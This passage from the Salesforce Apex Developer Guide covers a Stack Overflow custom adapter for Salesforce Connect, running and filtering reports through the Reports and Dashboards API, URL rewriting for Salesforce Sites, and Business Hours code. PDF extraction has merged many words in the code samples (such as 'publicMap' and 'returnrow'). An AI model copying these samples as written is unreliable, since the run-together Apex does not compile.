*   URL fieldson externalobjectrecordsbasedon the 'id'
*   valuethat’ssentby the externalsystem.
*
*   The Map<String,Object>itemparametermapsto the data
*   thatrepresentsa row.
*
*   Returnsan updatedmap withthe ExternalID and
*   DisplayURL values.
**/
publicMap<String, Object> createRow(
Map<String, Object> item) {
Map<String, Object> row = new Map<String, Object>();
for ( Stringkey : item.keySet()) {
if (key.equals('question_id') || key.equals('user_id')) {
row.put('ExternalId', item.get(key));
} elseif (key.equals('link')) {
row.put('DisplayUrl', item.get(key));
} elseif (key.equals('owner')) {
Map<String, Object> ownerMap=
(Map<String, Object>)item.get(key);
row.put('owner_id', ownerMap.get('user_id'));
}
row.put(key,item.get(key));
}
returnrow;
}
/**
*   Helpermethodto makethe HTTPGET call.
*   The url argumentis the URL of the externalsystem.
*   Returnsthe responsefromthe externalsystem.
**/
publicStringgetResponse(Stringurl){
// Performcalloutsfor production(non-test)results.
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndPoint(url);
request.setMethod('GET');
HttpResponseresponse= httpProtocol.send(request);
returnresponse.getBody();
}
}
575
Using Salesforce Features with ApexApex Developer Guide

StackOverflowPostDataSourceProvider Class
/**
*   Extendsthe DataSource.Providerbaseclassto createa
*   customadapterfor SalesforceConnect.The classinforms
*   Salesforceof the functionaland authentication
*   capabilitiesthatare supportedby or requiredto connect
*   to an externalsystem.
**/
globalclassStackOverflowPostDataSourceProvider
extendsDataSource.Provider{
/**
*   For simplicity,thisexampledeclaresthatthe external
*   systemdoesn’trequireauthenticationby returning
*   AuthenticationCapability.ANONYMOUSas the soleentry
*   in the listof authenticationcapabilities.
**/
overrideglobalList<DataSource.AuthenticationCapability>
getAuthenticationCapabilities(){
List<DataSource.AuthenticationCapability>capabilities=
new List<DataSource.AuthenticationCapability>();
capabilities.add(
DataSource.AuthenticationCapability.ANONYMOUS);
returncapabilities;
}
/**
*   Declaresthe functionalcapabilitiesthatthe
*   externalsystemsupports,in thiscase
*   onlySOQLqueries.
**/
overrideglobalList<DataSource.Capability>
getCapabilities(){
List<DataSource.Capability>capabilities=
new List<DataSource.Capability>();
capabilities.add(DataSource.Capability.ROW_QUERY);
returncapabilities;
}
/**
*   Declaresthe associatedDataSource.Connectionclass.
**/
overrideglobalDataSource.ConnectiongetConnection(
DataSource.ConnectionParamsconnectionParams){
returnnew
StackOverflowDataSourceConnection(connectionParams);
}
}
Salesforce Reports and Dashboards API via Apex
The Salesforce Reports and Dashboards API via Apex gives you programmatic access to your report data as defined in the report builder.
576
Using Salesforce Features with ApexApex Developer Guide

The API enables you to integrate report data into any web or mobile application, inside or outside the Salesforce platform. For example,
you might use the API to trigger a Chatter post with a snapshot of top-performing reps each quarter.
The Salesforce Reports and Dashboards API via Apex revolutionizes the way that you access and visualize your data. You can:
•
Integrate report data into custom objects.
•
Integrate report data into rich visualizations to animate the data.
•
Build custom dashboards.
•
Automate reporting tasks.
At a high level, the API resources enable you to query and filter report data. You can:
•
Run tabular, summary, or matrix reports synchronously or asynchronously.
•
Filter for specific data on the fly.
•
Query report data and metadata.
Requirements and Limitations
The Salesforce Reports and Dashboards API via Apex is available for organizations that have API enabled.
Run Reports
You can run a report synchronously or asynchronously through the Salesforce Reports and Dashboards API via Apex.
List Asynchronous Runs of a Report
You can retrieve up to 2,000 instances of a report that you ran asynchronously.
Get Report Metadata
You can retrieve report metadata to get information about a report and its report type.
Get Report Data
You can use the ReportResults class to get the fact map, which contains data that’s associated with a report.
Filter Reports
To get specific results on the fly, you can filter reports through the API.
Decode the Fact Map
The fact map contains the summary and record-level data values for a report.
Test Reports
Like all Apex code, Salesforce Reports and Dashboards API via Apex code requires test coverage.
SEE ALSO:
Apex Reference Guide: Reports Namespace
Requirements and Limitations
The Salesforce Reports and Dashboards API via Apex is available for organizations that have API enabled.
The following restrictions apply to the Reports and Dashboards API via Apex, in addition to general API limits.
•
Cross filters, standard report filters, and filtering by row limit are unavailable when filtering data.
•
Historical tracking reports are only supported for matrix reports.
•
Subscriptions aren't supported for historical tracking reports.
•
The API can process only reports that contain up to 100 fields selected as columns.
•
A list of up to 200 recently viewed reports can be returned.
577
Using Salesforce Features with ApexApex Developer Guide

•
Your org can request up to 500 synchronous report runs per hour.
•
The API supports up to 20 synchronous report run requests at a time.
•
A list of up to 2,000 instances of a report that was run asynchronously can be returned.
•
The API supports up to 200 requests at a time to get results of asynchronous report runs.
•
Your organization can request up to 1,200 asynchronous requests per hour.
•
Asynchronous report run results are available within a 24-hour rolling period.
•
The API returns up to the first 2,000 report rows. You can narrow results using filters.
•
You can add up to 20 custom field filters when you run a report.
•
If a report is run on a standard or custom object as an automated process user from an Apex test class, only the required custom
fields are returned. Non-required custom fields aren’t shown in the results.
•
Your org can request up to 200 dashboard refreshes per hour.
–
–
Your org can request results for up to 5,000 dashboards per hour.
In addition, the following restrictions apply to the Reports and Dashboards API via Apex.
•
Asynchronous report calls are not allowed in batch Apex.
•
Report calls are not allowed in Apex triggers.
•
There is no Apex method to list recently run reports.
•
The number of report rows processed during a synchronous report run count towards the governor limit that restricts the total
number of rows retrieved by SOQL queries to 50,000 rows per transaction. This limit is not imposed when reports are run
asynchronously.
•
In Apex tests, report runs always ignore the SeeAllData annotation, regardless of whether the annotation is set to true or
false. This means that report results will include pre-existing data that the test didn’t create. There is no way to disable the
SeeAllData annotation for a report execution. To limit results, use a filter on the report.
•
In Apex tests, asynchronous report runs will execute only after the test is stopped using the Test.stopTest method.
Note:  All limits that apply to reports created in the report builder also apply to the API. For more information, see “Analytics Limits”
in the Salesforce online help.
Run Reports
You can run a report synchronously or asynchronously through the Salesforce Reports and Dashboards API via Apex.
Reports can be run with or without details and can be filtered by setting report metadata. When you run a report, the API returns data
for the same number of records that are available when the report is run in the Salesforce user interface.
Run a report synchronously if you expect it to finish running quickly. Otherwise, we recommend that you run reports through the
Salesforce API asynchronously for these reasons:
•
Long-running reports have a lower risk of reaching the timeout limit when they are run asynchronously.
•
The Salesforce Reports and Dashboards API via Apex can handle a higher number of asynchronous run requests at a time.
•
Because the results of an asynchronously run report are stored for a 24-hour rolling period, they’re available for recurring access.
Example: Run a Report Synchronously
To run a report synchronously, use one of the ReportManager.runReport() methods. For example:
// Get the reportID
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
578
Using Salesforce Features with ApexApex Developer Guide

DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Run the report
Reports.ReportResultsresults= Reports.ReportManager.runReport(reportId,true);
System.debug('Synchronousresults:' + results);
Example: Run a Report Asynchronously
To run a report asynchronously, use one of the ReportManager.runAsyncReport() methods. For example:
// Get the reportID
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Run the report
Reports.ReportInstanceinstance= Reports.ReportManager.runAsyncReport(reportId,true);
System.debug('Asynchronousinstance:' + instance);
List Asynchronous Runs of a Report
You can retrieve up to 2,000 instances of a report that you ran asynchronously.
The instance list is sorted by the date and time when the report was run. Report results are stored for a rolling 24-hour period. During
this time, based on your user access level, you can access results for each instance of the report that was run.
Example: You can get the instance list by calling the ReportManager.getReportInstances method. For example:
// Get the reportID
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Run a reportasynchronously
Reports.ReportInstanceinstance= Reports.ReportManager.runAsyncReport(reportId,true);
System.debug('Listof asynchronousruns:' +
Reports.ReportManager.getReportInstances(reportId));
Get Report Metadata
You can retrieve report metadata to get information about a report and its report type.
Metadata includes information about fields that are used in the report for filters, groupings, detailed data, and summaries. You can use
the metadata to do several things:
•
Find out what fields and values you can filter on in the report type.
•
Build custom chart visualizations by using the metadata information on fields, groupings, detailed data, and summaries.
•
Change filters in the report metadata when you run a report.
Use the ReportResults.getReportMetadata method to retrieve report metadata. You can then use the “get” methods on
the ReportMetadata class to access metadata values.
579
Using Salesforce Features with ApexApex Developer Guide

Example: The following example retrieves metadata for a report.
// Get the reportID
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Run a report
Reports.ReportResultsresults= Reports.ReportManager.runReport(reportId);
// Get the reportmetadata
Reports.ReportMetadatarm = results.getReportMetadata();
System.debug('Name:' + rm.getName());
System.debug('ID:' + rm.getId());
System.debug('Currencycode:' + rm.getCurrencyCode());
System.debug('Developername:' + rm.getDeveloperName());
// Get groupinginfofor firstgrouping
Reports.GroupingInfogInfo= rm.getGroupingsDown()[0];
System.debug('Groupingname:' + gInfo.getName());
System.debug('Groupingsortorder:' + gInfo.getSortOrder());
System.debug('Groupingdategranularity:' + gInfo.getDateGranularity());
// Get aggregates
System.debug('Firstaggregate:' + rm.getAggregates()[0]);
System.debug('Secondaggregate:' + rm.getAggregates()[1]);
// Get detailcolumns
System.debug('Detailcolumns:' + rm.getDetailColumns());
// Get reportformat
System.debug('Reportformat:' + rm.getReportFormat());
Get Report Data
You can use the ReportResults class to get the fact map, which contains data that’s associated with a report.
Example: To access data values of the fact map, you can map grouping value keys to the corresponding fact map keys. In the
following example, imagine that you have an opportunity report that’s grouped by close month, and you’ve summarized the
amount field. To get the value for the summary amount for the first grouping in the report:
1.Get the first down-grouping in the report by using the ReportResults.getGroupingsDown method and accessing
the first GroupingValue object.
2.Get the grouping key value from the GroupingValue object by using the getKey method.
3.Construct a fact map key by appending '!T'to this key value. The resulting fact map key represents the summary value for
the first down-grouping.
4.Get the fact map from the report results by using the fact map key.
5.Get the first summary amount value by using the ReportFact.getAggregates method and accessing the first
SummaryValue object.
6.Get the field value from the first data cell of the first row of the report by using the ReportFactWithDetails.getRows
method.
580
Using Salesforce Features with ApexApex Developer Guide

// Get the reportID
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Run a reportsynchronously
Reports.reportResultsresults= Reports.ReportManager.runReport(reportId,true);
// Get the firstdown-groupingin the report
Reports.Dimensiondim = results.getGroupingsDown();
Reports.GroupingValuegroupingVal= dim.getGroupings()[0];
System.debug('Key:' + groupingVal.getKey());
System.debug('Label:' + groupingVal.getLabel());
System.debug('Value:' + groupingVal.getValue());
// Constructa factmap key,usingthe groupingkey value
StringfactMapKey= groupingVal.getKey()+ '!T';
// Get the factmap fromthe reportresults
Reports.ReportFactWithDetailsfactDetails=
(Reports.ReportFactWithDetails)results.getFactMap().get(factMapKey);
// Get the firstsummaryamountfromthe factmap
Reports.SummaryValuesumVal= factDetails.getAggregates()[0];
System.debug('SummaryValue:' + sumVal.getLabel());
// Get the fieldvaluefromthe firstdatacellof the firstrow of the report
Reports.ReportDetailRowdetailRow= factDetails.getRows()[0];
System.debug(detailRow.getDataCells()[0].getLabel());
Filter Reports
To get specific results on the fly, you can filter reports through the API.
Changes to filters that are made through the API don’t affect the source report definition. Using the API, you can filter with up to 20
custom field filters and add filter logic (such as AND and OR). But standard filters (such as range), filtering by row limit, and cross filters
are unavailable.
Before you filter a report, it’s helpful to check the following filter values in the metadata.
•
The ReportTypeColumn.getFilterable method tells you whether a field can be filtered.
•
The ReportTypeColumn.filterValues method returns all filter values for a field.
•
The ReportManager.dataTypeFilterOperatorMap method lists the field data types that you can use to filter the
report.
•
The ReportMetadata.getReportFilters method lists all filters that exist in the report.
You can filter reports during synchronous or asynchronous report runs.
Example: To filter a report, set filter values in the report metadata and then run the report. The following example retrieves the
report metadata, overrides the filter value, and runs the report. The example:
1.Retrieves the report filter object from the metadata by using the ReportMetadata.getReportFilters method.
2.Sets the value in the filter to a specific date by using the ReportFilter.setValue method and runs the report.
581
Using Salesforce Features with ApexApex Developer Guide

3.Overrides the filter value to a different date and runs the report again.
The output for the example shows the differing grand total values, based on the date filter that was applied.
// Get the reportID
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Get the reportmetadata
Reports.ReportDescribeResultdescribe= Reports.ReportManager.describeReport(reportId);
Reports.ReportMetadatareportMd= describe.getReportMetadata();
// Overridefilterand run report
Reports.ReportFilterfilter= reportMd.getReportFilters()[0];
filter.setValue('2013-11-01');
Reports.ReportResultsresults= Reports.ReportManager.runReport(reportId,reportMd);
Reports.ReportFactWithSummariesfactSum=
(Reports.ReportFactWithSummaries)results.getFactMap().get('T!T');
System.debug('Valuefor November:' + factSum.getAggregates()[0].getLabel());
// Overridefilterand run report
filter= reportMd.getReportFilters()[0];
filter.setValue('2013-10-01');
results= Reports.ReportManager.runReport(reportId,reportMd);
factSum= (Reports.ReportFactWithSummaries)results.getFactMap().get('T!T');
System.debug('Valuefor October:' + factSum.getAggregates()[0].getLabel());
Decode the Fact Map
The fact map contains the summary and record-level data values for a report.
Depending on how you run a report, the fact map in the report results can contain values for only summary or both summary and
detailed data. The fact map values are expressed as keys, which you can programmatically use to visualize the report data. Fact map
keys provide an index into each section of a fact map, from which you can access summary and detailed data.
The pattern for the fact map keys varies by report format as shown in this table.
Fact map key patternReport
format
T!T: The grand total of a report. Both record data values and the grand total are represented by this key.
Tabular
<Firstlevelrow grouping_secondlevelrow grouping_thirdlevelrow
grouping>!T: T refers to the row grand total.
Summary
<Firstlevelrow grouping_secondlevelrow grouping>!<Firstlevelcolumn
grouping_secondlevelcolumngrouping>.
Matrix
Each item in a row or column grouping is numbered starting with 0. Here are some examples of fact map keys:
582
Using Salesforce Features with ApexApex Developer Guide

DescriptionFact Map
Key
The first item in the first-level grouping.0!T
The second item in the first-level grouping.1!T
The first item in the first-level grouping and the first item in the second-level grouping.0_0!T
The first item in the first-level grouping and the second item in the second-level grouping.0_1!T
Let’s look at examples of how fact map keys represent data as it appears in a Salesforce tabular, summary, or matrix report.
Tabular Report Fact Map
Here’s an example of an opportunities report in tabular format. Since tabular reports don’t have groupings, all of the record level data
and summaries are expressed by the T!T key, which refers to the grand total.
Summary Report Fact Map
This example shows how the values in a summary report are represented in the fact map.
583
Using Salesforce Features with ApexApex Developer Guide

DescriptionFact Map Key
Summary for the value of opportunities in the Prospecting stage.0!T
Summary of the probabilities for the Manufacturing opportunities in the Needs Analysis stage.1_0!T
Matrix Report Fact Map
Here’s an example of some fact map keys for data in a matrix opportunities report with a couple of row and column groupings.
DescriptionFact Map Key
Total opportunity amount in the Prospecting stage in Q4 2010.0!0
Total opportunity amount in the Prospecting stage in the Manufacturing sector in October 2010.0_0!0_0
Total value of opportunities in the Value Proposition stage in the Technology sector in February 2011.2_1!1_1
Grand total summary for the report.T!T
Test Reports
Like all Apex code, Salesforce Reports and Dashboards API via Apex code requires test coverage.
The Reporting Apex methods don’t run in system mode, they run in the context of the current user (also called the context user or the
logged-in user). The methods have access to whatever the current user has access to.
584
Using Salesforce Features with ApexApex Developer Guide

In Apex tests, report runs always ignore the SeeAllData annotation, regardless of whether the annotation is set to true or false.
This means that report results will include pre-existing data that the test didn’t create. There is no way to disable the SeeAllData
annotation for a report execution. To limit results, use a filter on the report.
Example: Create a Reports Test Class
The following example tests asynchronous and synchronous reports. Each method:
•
Creates a new Opportunity object and uses it to set a filter on the report.
•
Runs the report.
•
Calls assertions to validate the data.
Note:  In Apex tests, asynchronous reports execute only after the test is stopped using the Test.stopTest method.
@isTest
publicclassReportsInApexTest{
@isTest(SeeAllData='true')
publicstaticvoidtestAsyncReportWithTestData(){
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
// Createan Opportunityobject.
Opportunityopp = new Opportunity(Name='ApexTestOpp', StageName='stage',
Probability= 95, CloseDate=system.today());
insertopp;
Reports.ReportMetadatareportMetadata=
Reports.ReportManager.describeReport(reportId).getReportMetadata();
// Add a filter.
List<Reports.ReportFilter>filters= new List<Reports.ReportFilter>();
Reports.ReportFilternewFilter= new Reports.ReportFilter();
newFilter.setColumn('OPPORTUNITY_NAME');
newFilter.setOperator('equals');
newFilter.setValue('ApexTestOpp');
filters.add(newFilter);
reportMetadata.setReportFilters(filters);
Test.startTest();
Reports.ReportInstanceinstanceObj=
Reports.ReportManager.runAsyncReport(reportId,reportMetadata,false);
StringinstanceId= instanceObj.getId();
// Reportinstanceis not availableyet.
Test.stopTest();
// Afterthe stopTestmethod,the reporthas finishedexecuting
// and the instanceis available.
instanceObj= Reports.ReportManager.getReportInstance(instanceId);
System.assertEquals(instanceObj.getStatus(),'Success');
Reports.ReportResultsresult= instanceObj.getReportResults();
585
Using Salesforce Features with ApexApex Developer Guide

Reports.ReportFactgrandTotal= (Reports.ReportFact)result.getFactMap().get('T!T');
System.assertEquals(1,(Decimal)grandTotal.getAggregates().get(1).getValue());
}
@isTest(SeeAllData='true')
publicstaticvoidtestSyncReportWithTestData(){
// Createan OpportunityObject.
Opportunityopp = new Opportunity(Name='ApexTestOpp', StageName='stage',
Probability= 95, CloseDate=system.today());
insertopp;
List<Report>reportList= [SELECTId,DeveloperNameFROMReportwhere
DeveloperName= 'Closed_Sales_This_Quarter'];
StringreportId= (String)reportList.get(0).get('Id');
Reports.ReportMetadatareportMetadata=
Reports.ReportManager.describeReport(reportId).getReportMetadata();
// Add a filter.
List<Reports.ReportFilter>filters= new List<Reports.ReportFilter>();
Reports.ReportFilternewFilter= new Reports.ReportFilter();
newFilter.setColumn('OPPORTUNITY_NAME');
newFilter.setOperator('equals');
newFilter.setValue('ApexTestOpp');
filters.add(newFilter);
reportMetadata.setReportFilters(filters);
Reports.ReportResultsresult=
Reports.ReportManager.runReport(reportId,reportMetadata,false);
Reports.ReportFactgrandTotal= (Reports.ReportFact)result.getFactMap().get('T!T');
System.assertEquals(1,(Decimal)grandTotal.getAggregates().get(1).getValue());
}
}
Salesforce Sites
Salesforce Sites lets you build custom pages and Web applications by inheriting Lightning Platform capabilities including analytics,
workflow and approvals, and programmable logic.
You can manage your Salesforce sites in Apex using the methods of the Site and Cookie classes.
586
Using Salesforce Features with ApexApex Developer Guide

Rewrite URLs for Salesforce Sites
Sites provides built-in logic that helps you display user-friendly URLs and links to site visitors. Create rules to rewrite URL requests
typed into the address bar, launched from bookmarks, or linked from external websites. You can also create rules to rewrite the URLs
for links within site pages. URL rewriting not only makes URLs more descriptive and intuitive for users, it allows search engines to
better index your site pages.
SEE ALSO:
Apex Reference Guide: Site Class
Rewrite URLs for Salesforce Sites
Sites provides built-in logic that helps you display user-friendly URLs and links to site visitors. Create rules to rewrite URL requests typed
into the address bar, launched from bookmarks, or linked from external websites. You can also create rules to rewrite the URLs for links
within site pages. URL rewriting not only makes URLs more descriptive and intuitive for users, it allows search engines to better index
your site pages.
For example, let's say that you have a blog site. Without URL rewriting, a blog entry's URL might look like this:
https://myblog.my.salesforce-sites.com/posts?id=003D000000Q0PcN
With URL rewriting, your users can access blog posts by date and title, say, instead of by record ID. The URL for one of your New Year's
Eve posts might be: https://myblog.my.salesforce-sites.com/posts/2019/12/31/auld-lang-syne
You can also rewrite URLs for links shown within a site page. If your New Year's Eve post contained a link to your Valentine's Day post,
the link URL might show: https://myblog.my.salesforce-sites.com/posts/2019/02/14/last-minute-roses
To rewrite URLs for a site, create an Apex class that maps the original URLs to user-friendly URLs, and then add the Apex class to your
site.
To learn about the methods in the Site.UrlRewriterinterface, see UrlRewriter Interface.
Creating the Apex Class
The Apex class that you create must implement the provided interface Site.UrlRewriter. In general, it must have the following
form:
globalclassyourClassimplementsSite.UrlRewriter{
globalPageReferencemapRequestUrl(PageReference
yourFriendlyUrl)
globalPageReference[]generateUrlFor(PageReference[]
yourSalesforceUrls);
}
Consider the following restrictions and recommendations as you create your Apex class:
Class and Methods Must Be Global
The Apex class and methods must all be global.
Class Must Include Both Methods
The Apex class must implement both the mapRequestUrl and generateUrlFor methods. If you don't want to use one
of the methods, simply have it return null.
Rewriting Only Works for Visualforce Site Pages
Incoming URL requests can only be mapped to Visualforce pages associated with your site. You can't map to standard pages, images,
or other entities.
587
Using Salesforce Features with ApexApex Developer Guide

To rewrite URLs for links on your site's pages, use the !URLFOR function with the $Page merge variable. For example, the
following links to a Visualforce page named myPage:
<apex:outputLinkvalue="{!URLFOR($Page.myPage)}"></apex:outputLink>
Note:  Visualforce <apex:form> elements with forceSSL=”true” aren't affected by the urlRewriter.
See the “Functions” appendix of the Visualforce Developer's Guide.
Encoded URLs
The URLs you get from using the Site.urlRewriter interface are encoded. If you need to access the unencoded values of
your URL, use the urlDecode method of the EncodingUtil Class.
Restricted Characters
User-friendly URLs must be distinct from Salesforce URLs. URLs with a 3-character entity prefix or a 15- or 18-character ID aren’t
rewritten.
You can’t use periods in your user-friendly or rewritten URLs, except for the .well-known path component, which can’t be used
at the end of a URL.
Restricted Strings
You can’t use the following reserved strings as the first path component after a site’s base URL in either a user-friendly URL or a
rewritten URL. Some examples of the first past component after a site’s base URL are baseURL in
https://MyDomainName.my.salesforce-sites.com/baseURL, https://MyDomainName.my.salesforce-sites.com/pathPrefix/baseURL,
https://custom-domain/pathPrefix/baseURL, and https://MyDomainName.my.salesforce-sites.com/pathPrefix/baseURL/another/path.
•
apexcomponent
•
apexpages
•
aura
•
chatter
•
chatteranswers
•
chatterservice
•
cometd
•
ex
•
faces
•
flash
•
flex
•
google
•
home
•
id
•
ideas
•
idp
•
images
•
img
•
javascript
•
js
•
knowledge
•
lightning
588
Using Salesforce Features with ApexApex Developer Guide

•
login
•
m
•
mobile
•
ncsphoto
•
nui
•
push
•
resource
•
saml
•
sccommunities
•
search
•
secur
•
services
•
servlet
•
setup
•
sfc
•
sfdc
•
sfdc_ns
•
sfsites
•
site
•
style
•
vote
•
WEB-INF
•
widg
You can't use the following reserved strings at the end of a rewritten URL path:
•
/aura
•
/auraFW
•
/auraResource
•
/AuraJLoggingRPCService
•
/AuraJLVRPCService
•
/AuraJRPCService
•
/dbcthumbnail
•
/HelpAndTrainingDoor
•
/htmldbcthumbnail
•
/l
•
/m
•
/mobile
Relative Paths Only
The PageReference.getUrl() method only returns the part of the URL immediately following the host name or site prefix (if any). For
example, if your URL is https://mycompany.my.salesforce-sites.com/sales/MyPage?id=12345, where
“sales” is the site prefix, only /MyPage?id=12345 is returned.
589
Using Salesforce Features with ApexApex Developer Guide

You can't rewrite the domain or site prefix.
Unique Paths Only
You can't map a URL to a directory that has the same name as your site prefix. For example, if your site URL is
https://acme.my.salesforce-sites.com/help, where “help” is the site prefix, you can't point the URL to
help/page. The resulting path, https://acme.my.salesforce-sites.com/help/help/page, would be
returned instead as https://acme.my.salesforce-sites.com/help/page.
Query in Bulk
For better performance with page generation, perform tasks in bulk rather than one at a time for the generateUrlFor method.
Enforce Field Uniqueness
Make sure the fields you choose for rewriting URLs are unique. Using unique or indexed fields in SOQL for your queries may improve
performance.
Adding URL Rewriting to a Site
Once you've created the URL rewriting Apex class, follow these steps to add it to your site:
1.From Setup, enter Sites in the QuickFind box, then select Sites.
2.Click New or click Edit for an existing site.
3.On the Site Edit page, choose an Apex class for URL RewriterClass.
4.Click Save.
Note:  If you have URL rewriting enabled on your site, all PageReferences are passed through the URL rewriter. PageReferences
with redirect set to true and a redirectCode other than 0 return redirected URLs instead of rewritten URLs.
Code Example
In this example, we have a simple site consisting of two Visualforce pages: mycontact and myaccount. Be sure you have “Read” permission
enabled for both before trying the sample. Each page uses the standard controller for its object type. The contact page includes a link
to the parent account, plus contact details.
Before implementing rewriting, the address bar and link URLs showed the record ID (a random 15-digit string), illustrated in the “before”
figure. Once rewriting was enabled, the address bar and links show more user-friendly rewritten URLs, illustrated in the “after” figure.
The Apex class used to rewrite the URLs for these pages is shown in Example URL Rewriting Apex Class, with detailed comments.
Example Site Pages
This section shows the Visualforce for the account and contact pages used in this example.
The account page uses the standard controller for accounts and is nothing more than a standard detail page. This page should be named
myaccount.
<apex:pagestandardController="Account">
<apex:detailrelatedList="false"/>
</apex:page>
The contact page uses the standard controller for contacts and consists of two parts. The first part links to the parent account using the
URLFOR function and the $Page merge variable; the second simply provides the contact details. Notice that the Visualforce page
doesn't contain any rewriting logic except URLFOR. This page should be named mycontact.
<apex:pagestandardController="contact">
<apex:pageBlocktitle="ParentAccount">
590
Using Salesforce Features with ApexApex Developer Guide

<apex:outputLinkvalue="{!URLFOR($Page.mycontact,null,
[id=contact.account.id])}">{!contact.account.name}
</apex:outputLink>
</apex:pageBlock>
<apex:detailrelatedList="false"/>
</apex:page>
Example URL Rewriting Apex Class
The Apex class used as the URL rewriter for the site uses the mapRequestUrl method to map incoming URL requests to the right
Salesforce record. It also uses the generateUrlFor method to rewrite the URL for the link to the account page in a more user-friendly
form.
globalwithsharingclassmyRewriterimplementsSite.UrlRewriter{
//Variablesto representthe user-friendlyURLsfor
//accountand contactpages
StringACCOUNT_PAGE= '/myaccount/';
StringCONTACT_PAGE= '/mycontact/';
//Variablesto representmy customVisualforcepages
//thatdisplayaccountand contactinformation
StringACCOUNT_VISUALFORCE_PAGE= '/myaccount?id=';
StringCONTACT_VISUALFORCE_PAGE= '/mycontact?id=';
globalPageReferencemapRequestUrl(PageReference
myFriendlyUrl){
Stringurl = myFriendlyUrl.getUrl();
if(url.startsWith(CONTACT_PAGE)){
//Extractthe nameof the contactfromthe URL
//Forexample:/mycontact/RyanreturnsRyan
Stringname= url.substring(CONTACT_PAGE.length(),
url.length());
//Selectthe ID of the contactthatmatches
//thenamefromthe URL
Contactcon = [SELECTId FROMContactWHEREName=:
nameLIMIT1];
//Constructa new pagereferencein the form
//ofmy Visualforcepage
returnnew PageReference(CONTACT_VISUALFORCE_PAGE+ con.id);
}
if(url.startsWith(ACCOUNT_PAGE)){
//Extractthe nameof the account
Stringname= url.substring(ACCOUNT_PAGE.length(),
url.length());
//Queryfor the ID of an accountwiththisname
Accountacc = [SELECTId FROMAccountWHEREName=:nameLIMIT1];
//Returna pagein Visualforceformat
returnnew PageReference(ACCOUNT_VISUALFORCE_PAGE+ acc.id);
}
591
Using Salesforce Features with ApexApex Developer Guide

//Ifthe URL isn'tin the formof a contactor
//accountpage,continuewiththe request
returnnull;
}
globalList<PageReference>generateUrlFor(List<PageReference>
mySalesforceUrls){
//A listof pagesto returnafterall the links
//havebeenevaluated
List<PageReference>myFriendlyUrls= new List<PageReference>();
//a listof all the ids in the urls
List<id>accIds= new List<id>();
// loopthroughall the urlsonce,findingall the validids
for(PageReferencemySalesforceUrl: mySalesforceUrls){
//Getthe URL of the page
Stringurl = mySalesforceUrl.getUrl();
//Ifthislookslikean accountpage,transformit
if(url.startsWith(ACCOUNT_VISUALFORCE_PAGE)){
//Extractthe ID fromthe queryparameter
//andstorein a list
//forqueryinglaterin bulk.
Stringid= url.substring(ACCOUNT_VISUALFORCE_PAGE.length(),
url.length());
accIds.add(id);
}
}
// Get all the accountnamesin bulk
List<account>accounts= [SELECTNameFROMAccountWHEREId IN :accIds];
// makethe new urls
Integercounter= 0;
// it is importantto go throughall the urlsagain,so thatthe order
// of the urlsin the listis maintained.
for(PageReferencemySalesforceUrl: mySalesforceUrls){
//Getthe URL of the page
Stringurl = mySalesforceUrl.getUrl();
if(url.startsWith(ACCOUNT_VISUALFORCE_PAGE)){
myFriendlyUrls.add(new PageReference(ACCOUNT_PAGE+ accounts.get(counter).name));
counter++;
} else{
//Ifthisdoesn'tstartlikean accountpage,
//don'tdo any transformations
myFriendlyUrls.add(mySalesforceUrl);
}
}
//Returnthe fulllistof pages
592
Using Salesforce Features with ApexApex Developer Guide

returnmyFriendlyUrls;
}
}
Before and After Rewriting
Here is a visual example of the results of implementing the Apex class to rewrite the original site URLs. Notice the ID-based URLs in the
first figure, and the user-friendly URLs in the second.
Site URLs Before Rewriting
The numbered elements in this figure are:
1.The original URL for the contact page before rewriting
2.The link to the parent account page from the contact page
3.The original URL for the link to the account page before rewriting, shown in the browser's status bar
593
Using Salesforce Features with ApexApex Developer Guide

Site URLs After Rewriting
The numbered elements in this figure are:
1.The rewritten URL for the contact page after rewriting
2.The link to the parent account page from the contact page
3.The rewritten URL for the link to the account page after rewriting, shown in the browser's status bar
Support Classes
Support classes allow you to interact with records commonly used by support centers, such as business hours and cases.
Working with Business Hours
Business hours are used to specify the hours at which your customer support team operates, including multiple business hours in multiple
time zones.
This example finds the time one business hour from startTime, returning the Datetime in the local time zone. It gets the default business
hours by querying BusinessHours. Also, it calls the BusinessHoursadd method.
// Get the defaultbusinesshours
BusinessHoursbh = [SELECTId FROMBusinessHoursWHEREIsDefault=true];
// CreateDatetimeon May 28, 2008at 1:06:08AM in localtimezone.
DatetimestartTime= Datetime.newInstance(2008,5, 28, 1, 6, 8);
// Findthe timeit willbe one businesshourfromMay 28, 2008,1:06:08AM usingthe
// defaultbusinesshours.The returnedDatetimewillbe in the localtimezone.
DatetimenextTime= BusinessHours.add(bh.id,startTime,60 * 60 * 1000L);
This example finds the time one business hour from startTime, returning the Datetime in GMT:
// Get the defaultbusinesshours
BusinessHoursbh = [SELECTId FROMBusinessHoursWHEREIsDefault=true];
594
Using Salesforce Features with ApexApex Developer Guide

// CreateDatetimeon May 28, 2008at 1:06:08AM in localtimezone.
DatetimestartTime= Datetime.newInstance(2008,5, 28, 1, 6, 8);
// Findthe timeit willbe one businesshourfromMay 28, 2008,1:06:08AM usingthe
// defaultbusinesshours.The returnedDatetimewillbe in GMT.
DatetimenextTimeGmt= BusinessHours.addGmt(bh.id,startTime,60 * 60 * 1000L);
The next example finds the difference between startTime and nextTime:
// Get the defaultbusinesshours
BusinessHoursbh = [selectid frombusinesshourswhereIsDefault=true];
